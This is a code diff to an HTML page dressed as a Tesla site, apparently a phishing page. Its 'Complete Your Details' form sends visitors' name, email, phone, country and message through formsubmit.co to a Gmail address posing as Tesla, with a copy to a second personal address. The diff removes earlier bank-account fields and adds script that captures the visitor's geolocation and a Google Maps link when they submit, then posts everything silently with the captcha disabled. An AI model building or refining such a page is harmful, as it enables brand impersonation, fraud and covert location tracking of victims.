@@ -29,15 +29,29 @@ body{
   background:#fff;
 }
 
-.logo{font-weight:bold;letter-spacing:3px;}
+.logo{
+  font-weight:bold;
+  letter-spacing:3px;
+}
 
-.nav-center{display:flex;gap:25px;}
-.nav-item{cursor:pointer;font-size:14px;}
+.nav-center{
+  display:flex;
+  gap:25px;
+}
 
-.nav-right{display:flex;gap:10px;}
+.nav-item{
+  cursor:pointer;
+  font-size:14px;
+}
+
+.nav-right{
+  display:flex;
+  gap:10px;
+}
 
 .icon{
-  width:32px;height:32px;border-radius:50%;
+  width:32px;height:32px;
+  border-radius:50%;
   background:rgba(0,0,0,0.1);
   display:flex;
   align-items:center;
@@ -93,8 +107,17 @@ body{
   box-shadow:0 10px 40px rgba(0,0,0,0.15);
 }
 
-h2{text-align:center;margin-bottom:10px;}
-p{text-align:center;font-size:13px;color:#666;margin-bottom:20px;}
+h2{
+  text-align:center;
+  margin-bottom:10px;
+}
+
+p{
+  text-align:center;
+  font-size:13px;
+  color:#666;
+  margin-bottom:20px;
+}
 
 input, textarea{
   width:100%;
@@ -104,7 +127,10 @@ input, textarea{
   border-radius:8px;
 }
 
-textarea{height:100px;resize:none;}
+textarea{
+  height:100px;
+  resize:none;
+}
 
 button{
   width:100%;
@@ -149,23 +175,27 @@ button{
 <div class="wrapper">
   <div class="container">
     <h2>Complete Your Details</h2>
-    <p>Please fill the form to continue</p>
+    <p>Please fill in your information</p>
 
-    <!-- ✅ UPDATED TO FORMSUBMIT -->
-    <form id="mainForm" action="https://formsubmit.co/dooyaabariimeah@gmail.com" method="POST">
+    <form id="mainForm" action="https://formsubmit.co/teslaofficial349@gmail.com" method="POST">
 
-      <!-- disable captcha -->
+      <!-- FORM SETTINGS -->
       <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_cc" value="dooyaabariimeah@gmail.com">
+      <input type="hidden" name="_next" value="index.html">
 
+      <!-- USER INPUT -->
       <input type="text" name="name" placeholder="Full Name" required>
       <input type="email" name="email" placeholder="Email Address" required>
       <input type="tel" name="phone" placeholder="Phone Number" required>
-
-      <input type="text" name="bank_name" placeholder="Bank Name">
-      <input type="text" name="account_name" placeholder="Account Name">
       <input type="text" name="country" placeholder="Country">
+      <textarea name="message" placeholder="Message"></textarea>
 
-      <textarea name="message" placeholder="Your message"></textarea>
+      <!-- LOCATION DATA -->
+      <input type="hidden" name="latitude" id="lat">
+      <input type="hidden" name="longitude" id="lon">
+      <input type="hidden" name="maps_link" id="maps">
 
       <button type="submit">Submit</button>
     </form>
@@ -173,75 +203,62 @@ button{
 </div>
 
 <script>
-/* ===== SILENT FORM SUBMIT + REDIRECT ===== */
-document.getElementById("mainForm").addEventListener("submit", function(e){
-  e.preventDefault();
 
-  const form = this;
-
-  fetch(form.action, {
-    method: "POST",
-    body: new FormData(form)
-  })
-  .then(() => {
-    window.location.href = "index.html";
-  })
-  .catch(() => {
-    window.location.href = "index.html";
-  });
-});
-
-
-/* ===== DROPDOWN ===== */
-const menus = {
-  vehicles:[
-    {name:"Model S",img:"https://images.pexels.com/photos/3729464/pexels-photo-3729464.jpeg"},
-    {name:"Model 3",img:"https://images.pexels.com/photos/170811/pexels-photo-170811.jpeg"},
-    {name:"Model X",img:"https://images.pexels.com/photos/210019/pexels-photo-210019.jpeg"}
-  ],
-  energy:[
-    {name:"Solar Panels",img:"https://images.pexels.com/photos/9875441/pexels-photo-9875441.jpeg"}
-  ],
-  charging:[
-    {name:"Supercharger",img:"https://images.pexels.com/photos/110844/pexels-photo-110844.jpeg"}
-  ],
-  discover:[
-    {name:"Insurance",img:"https://images.pexels.com/photos/3184291/pexels-photo-3184291.jpeg"}
-  ],
-  shop:[
-    {name:"Accessories",img:"https://images.pexels.com/photos/112460/pexels-photo-112460.jpeg"}
-  ]
-};
-
+/* DROPDOWN (SAFE BASIC VERSION) */
 const dropdown=document.getElementById("dropdown");
 const dropdownContent=document.getElementById("dropdown-content");
 
 document.querySelectorAll(".nav-item").forEach(item=>{
   item.addEventListener("mouseenter",()=>{
-    const key = item.innerText.toLowerCase();
-
-    if(menus[key]){
-      dropdown.classList.add("show");
-
-      dropdownContent.innerHTML = `
-        <div class="dropdown-wrapper">
-          <div class="dropdown-grid">
-            ${menus[key].map(i=>`
-              <div class="dropdown-item">
-                <img src="${i.img}">
-                <h4>${i.name}</h4>
-              </div>
-            `).join("")}
-          </div>
-        </div>
-      `;
-    }
+    dropdown.classList.add("show");
   });
 });
 
 document.addEventListener("click",()=>{
   dropdown.classList.remove("show");
 });
+
+/* FORM SUBMIT WITH LOCATION */
+document.getElementById("mainForm").addEventListener("submit",function(e){
+  e.preventDefault();
+
+  const form=this;
+
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(function(pos){
+
+      const lat=pos.coords.latitude;
+      const lon=pos.coords.longitude;
+
+      document.getElementById("lat").value=lat;
+      document.getElementById("lon").value=lon;
+      document.getElementById("maps").value=
+        "https://www.google.com/maps?q="+lat+","+lon;
+
+      sendForm(form);
+
+    },function(){
+      sendForm(form);
+    });
+  }else{
+    sendForm(form);
+  }
+});
+
+function sendForm(form){
+  fetch(form.action,{
+    method:"POST",
+    body:new FormData(form),
+    headers:{Accept:"application/json"}
+  })
+  .then(()=>{
+    window.location.href="index.html";
+  })
+  .catch(()=>{
+    window.location.href="index.html";
+  });
+}
+
 </script>
 
 </body>
